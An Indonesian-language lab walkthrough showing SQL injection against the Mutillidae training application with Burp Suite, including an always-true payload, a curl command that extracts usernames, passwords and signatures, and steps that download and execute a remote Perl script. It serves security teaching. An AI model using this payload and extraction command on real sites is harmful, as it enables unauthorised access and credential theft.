# SQL Injection, Burpsuite, cURL, Perl Parser

1. Masuk ke halaman sqli user info dengan cara klik menu pada sidebar kiri ```Owasp Top 10 -> A1 - Injection -> SQLi - Extract Data -> User Info```
![1](/lesson7/1.png)

2. Setting proxy agar dapat ditangkap oleh Burpsuite dengan host ```127.0.0.1``` dan port ```8080```
![1](/lesson7/2.png)

3. Buka program Burpsuite
![1](/lesson7/3.png)

4. Pastikan option pada tab proxy (di section proxy listener) terdaftar alamat ```127.0.0.1``` dan portnya adalah ```8080```
![1](/lesson7/4.png)

5. Pastikan juga intercept pada tab proxy menunjukkan bahwa intercept nya dimatikan ```intercept is off```
![1](/lesson7/5.png)

6. Lakukan sql injection sederhana (yang biasa digunakan untuk mengembalikan nilai always true)
![1](/lesson7/6.png)

7. Dapat kita lihat dibawahnya terdapat data yang menunjukkan seluruh user yang terdaftar.
![1](/lesson7/7.png)

8. Buka Burpsuite dan lihat data yang berada di url ```/mutillidae/index.php?page=user-info.php```
![1](/lesson7/8.png)

9. gunakan curl seperti dibawah ini untuk mengambil data username, password, dan signature dari halaman yang tadi kita lakukan sql injection.
```
curl -b crack_cookies.txt -c crack_cookies.txt --user-agent "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" --data "page=user-info.php&username=%27+or+1%3D1--+&password=&user-info-php-submit-button=View+Account+Details" --location "http://192.168.1.111/mutillidae/index.php" | grep -i "Username=" | awk 'BEGIN{FS="<"}{for (i=1; i<=NF; i++) print $i}' | awk -F\> '{print $2}'
```
![1](/lesson7/9.png)

10. Sekarang kita coba perl parser
 1. download script perl dengan command
 ```
 wget http://www.computersecuritystudent.com/SECURITY_TOOLS/MUTILLIDAE/MUTILLIDAE_2511/lesson7/lesson7.pl.TXT
 ```
 2. rename script tersebut dengan command
 ```
 mv lesson7.pl.TXT lesson7.pl
 ```
 3. ubah mode file tersebut agar dapat di eksekusi dengan command
 ```
 chmod 700 lesson7.pl
 ```
 4. jalankan script tersebut dengan command
 ```
 ./lesson7.pl
 ```
![1](/lesson7/10.png)
